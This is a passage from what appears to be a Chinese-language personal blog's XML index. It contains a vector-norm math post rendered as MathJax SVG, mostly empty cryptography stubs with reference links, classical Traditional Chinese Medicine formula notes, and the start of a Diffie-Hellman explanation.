117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,353.6) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(518,-293.8) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(0,-476.4)"><path data-c="E001" d="M702 589Q706 601 718 605H1061Q1076 597 1076 585Q1076 572 1061 565H742V0Q734 -14 724 -14H722H720Q708 -14 702 0V589Z" transform="translate(0,1945)"></path><path data-c="23B7" d="M742 -871Q740 -873 737 -876T733 -880T730 -882T724 -884T714 -885H702L222 569L180 484Q138 399 137 399Q131 404 124 412L111 425L265 736L702 -586V168L703 922Q713 935 722 935Q734 935 742 920V-871Z" transform="translate(0,-165)"></path><svg width="1056" height="1361" y="670" x="0" viewBox="0 295.5 1056 1361"><path data-c="E000" d="M722 -14H720Q708 -14 702 0V306L703 612Q713 625 722 625Q734 625 742 610V0Q734 -14 724 -14H722Z" transform="scale(1,3.195)"></path></svg></g><rect width="2532.2" height="60" x="1056" y="2013.6"></rect></g></g></g></svg></mjx-container></p><p>其中，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.336ex" height="2.48ex" role="img" focusable="false" viewBox="0 -846 8104.6 1096"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(270.3,32) translate(-250 0)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="mo" transform="translate(762.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(1818.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(2207.6,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(3129.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(3573.8,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4495.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(4940,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(6278.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(6723.3,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7715.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> 是一个 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container> 维向量。欧几里得范数也可以写成 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="12.119ex" height="2.929ex" role="img" focusable="false" viewBox="0 -1045 5356.6 1294.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(278,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(270.3,32) translate(-250 0)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="msub" transform="translate(763,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mn" transform="translate(311,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1755.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(2811.1,0)"><g transform="translate(853,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(270.3,32) translate(-250 0)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="mo" transform="translate(707.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1207.4,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(270.3,32) translate(-250 0)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(0,185)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="1692.4" height="60" x="853" y="925"></rect></g></g></g></svg></mjx-container>，其中 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0.43ex;" xmlns="http://www.w3.org/2000/svg" width="0.629ex" height="0.271ex" role="img" focusable="false" viewBox="0 -310 278 120"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g></g></g></svg></mjx-container> 表示向量的点积。</p><p>与复数的模相比，范数符号 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="2.892ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 1278.4 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(500.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1000.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container> 更加通用，可以用于表示不同类型的向量的大小或距离，而不仅仅是复数。但是，它们之间也存在一些相似之处，例如它们都具有非负性、可以用于计算距离等。</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Merkle Patricia Tree</title>
      <link href="/2023/04/19/crypto/Merkle-Patricia-Tree/"/>
      <url>/2023/04/19/crypto/Merkle-Patricia-Tree/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Merkle Tree </tag>
            
            <tag> MPT </tag>
            
            <tag> Merkle Patricia Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sybil Attacks</title>
      <link href="/2023/04/19/crypto/Sybil-Attack/"/>
      <url>/2023/04/19/crypto/Sybil-Attack/</url>
      
        <content type="html"><![CDATA[<p><img src="/assets/images/sybil-attacks.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://academy.binance.com/zh/articles/sybil-attacks-explained">https://academy.binance.com/zh/articles/sybil-attacks-explained</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sybil Attacks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Turning Complete</title>
      <link href="/2023/04/19/crypto/Turing-Complete/"/>
      <url>/2023/04/19/crypto/Turing-Complete/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Turning Complete </tag>
            
            <tag> 图灵完备 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zero Knowledge Proof</title>
      <link href="/2023/04/19/crypto/zero-knowledge-proofs/"/>
      <url>/2023/04/19/crypto/zero-knowledge-proofs/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://ethereum.org/zh/zero-knowledge-proofs/">https://ethereum.org/zh/zero-knowledge-proofs/</a></li><li><a href="https://blog.chain.link/what-is-a-zero-knowledge-proof-zkp-zh/">https://blog.chain.link/what-is-a-zero-knowledge-proof-zkp-zh/</a></li><li><a href="https://academy.binance.com/zh/articles/what-is-zero-knowledge-proof-and-how-does-it-impact-blockchain">https://academy.binance.com/zh/articles/what-is-zero-knowledge-proof-and-how-does-it-impact-blockchain</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Zero Knowledge Proof </tag>
            
            <tag> 零知识证明 </tag>
            
            <tag> ZKP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大青龙汤</title>
      <link href="/2023/04/18/TCM/%E5%A4%A7%E9%9D%92%E9%BE%99%E6%B1%A4/"/>
      <url>/2023/04/18/TCM/%E5%A4%A7%E9%9D%92%E9%BE%99%E6%B1%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="主治"><a href="#主治" class="headerlink" title="主治"></a>主治</h2><ul><li>《伤寒论》：太阳中风，脉浮紧，发热恶寒，身疼痛，不汗出而烦躁者；伤寒，脉浮缓，身不疼，但重，乍有轻时，无少阴证者。</li><li>《金匮要略》：病溢饮者。</li><li>《医方集解》：风寒两解。</li><li>《伤寒论方解》：发汗定喘，解热除烦，利小便以驱除水气。</li></ul><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>麻黄六两(去节）<br>桂枝二两(去皮）<br>甘草二两(炙）<br>杏仁四十枚(去皮尖）<br>生姜三两(切）<br>大枣十二枚(擘）<br>石膏如鸡子大(碎）</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>以水九升，先煮麻黄，减二升，去上沫纳诸药，煮取三升，去滓，温服一升。取微似汗，汗出多者，温粉扑之；一服汗者，停后服；若复服，汗多亡阳，遂虚，恶风烦躁不得眠也。</p><h2 id="禁忌"><a href="#禁忌" class="headerlink" title="禁忌"></a>禁忌</h2><p>若脉微弱，汗出恶风者，不可服之。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://www.huabeing.com/PRES/PresDetail?ENTRY_ID=11EFD1C55B04423195A64EBB3A20366E">http://www.huabeing.com/PRES/PresDetail?ENTRY_ID&#x3D;11EFD1C55B04423195A64EBB3A20366E</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Traditional Chinese Medicine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小青龙汤</title>
      <link href="/2023/04/18/TCM/%E5%B0%8F%E9%9D%92%E9%BE%99%E6%B1%A4/"/>
      <url>/2023/04/18/TCM/%E5%B0%8F%E9%9D%92%E9%BE%99%E6%B1%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="主治"><a href="#主治" class="headerlink" title="主治"></a>主治</h2><ul><li>《伤寒论》：伤寒表不解，心下有水气，干呕，发热而咳，或渴，或利，或噎，或小便不利，少腹满，或喘者；伤寒，心下有水气，咳而微喘，发热不渴。</li><li>《金匮要略》：溢饮；咳逆倚息不得卧；妇人吐涎沫。</li></ul><h2 id="加减"><a href="#加减" class="headerlink" title="加减"></a>加减</h2><p>若渴，去半夏，加栝楼根三两；若微利，去麻黄，加荛花如一鸡子（熬令赤色）；若噎者，去麻黄，加附子一枚（炮）；若小便不利，少腹满者，去麻黄，加茯苓四两；若喘，去麻黄，加杏仁半斤（去皮尖）。五味子为佐，以收逆气。</p><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>麻黄(去节)<br>芍药<br>细辛<br>干姜<br>甘草(炙)<br>桂枝(去皮)<br>各三两</p><p>五味子半升<br>半夏半升(洗)</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://www.huabeing.com/PRES/PresDetail?ENTRY_ID=763FF6596FC84F4391C9D55FB8665143">http://www.huabeing.com/PRES/PresDetail?ENTRY_ID&#x3D;763FF6596FC84F4391C9D55FB8665143</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Traditional Chinese Medicine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>桂枝芍药知母汤</title>
      <link href="/2023/04/18/TCM/%E6%A1%82%E6%9E%9D%E8%8A%8D%E8%8D%AF%E7%9F%A5%E6%AF%8D%E6%B1%A4/"/>
      <url>/2023/04/18/TCM/%E6%A1%82%E6%9E%9D%E8%8A%8D%E8%8D%AF%E7%9F%A5%E6%AF%8D%E6%B1%A4/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Traditional Chinese Medicine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>麻黄桂枝汤</title>
      <link href="/2023/04/18/TCM/%E9%BA%BB%E9%BB%84%E6%A1%82%E6%9E%9D%E6%B1%A4/"/>
      <url>/2023/04/18/TCM/%E9%BA%BB%E9%BB%84%E6%A1%82%E6%9E%9D%E6%B1%A4/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Traditional Chinese Medicine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AMMs Automated Market Makers</title>
      <link href="/2023/04/18/crypto/AMMs%20Automated%20Market%20Makers/"/>
      <url>/2023/04/18/crypto/AMMs%20Automated%20Market%20Makers/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bitcoin</title>
      <link href="/2023/04/18/crypto/Bitcoin/"/>
      <url>/2023/04/18/crypto/Bitcoin/</url>
      
        <content type="html"><![CDATA[<h2 id="一种点对点电子货币系统"><a href="#一种点对点电子货币系统" class="headerlink" title="一种点对点电子货币系统"></a>一种点对点电子货币系统</h2><h3 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h3><h3 id="时间戳服务器"><a href="#时间戳服务器" class="headerlink" title="时间戳服务器"></a>时间戳服务器</h3><h3 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h3><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><h3 id="激励"><a href="#激励" class="headerlink" title="激励"></a>激励</h3><h3 id="回收磁盘空间-Merkle-Tree"><a href="#回收磁盘空间-Merkle-Tree" class="headerlink" title="回收磁盘空间 Merkle Tree"></a>回收磁盘空间 Merkle Tree</h3><h3 id="简化支付验证-SPV"><a href="#简化支付验证-SPV" class="headerlink" title="简化支付验证 SPV"></a>简化支付验证 SPV</h3><h3 id="合并和分割交易额"><a href="#合并和分割交易额" class="headerlink" title="合并和分割交易额"></a>合并和分割交易额</h3><h3 id="隐私"><a href="#隐私" class="headerlink" title="隐私"></a>隐私</h3><h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://bitcoin.org/files/bitcoin-paper/bitcoin_zh_cn.pdf">https://bitcoin.org/files/bitcoin-paper/bitcoin_zh_cn.pdf</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bitcoin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Curve25519 X25519 Ed25519</title>
      <link href="/2023/04/18/crypto/Curve25519,%20X25519%20and%20Ed25519/"/>
      <url>/2023/04/18/crypto/Curve25519,%20X25519%20and%20Ed25519/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Diffie Hellman</title>
      <link href="/2023/04/18/crypto/Diffie%20Hellman/"/>
      <url>/2023/04/18/crypto/Diffie%20Hellman/</url>
      
        <content type="html"><![CDATA[<h3 id="DH-Key-Exchange"><a href="#DH-Key-Exchange" class="headerlink" title="DH-Key Exchange"></a>DH-Key Exchange</h3><p>[Image of Alice and Bob]</p><p>Alice and Bob want to communicate securely. They use DH-Key Exchange to establish a shared secret.</p><ol><li>Alice selects a private value, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.197ex" height="1.02ex" role="img" focusable="false" viewBox="0 -441 529 451"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 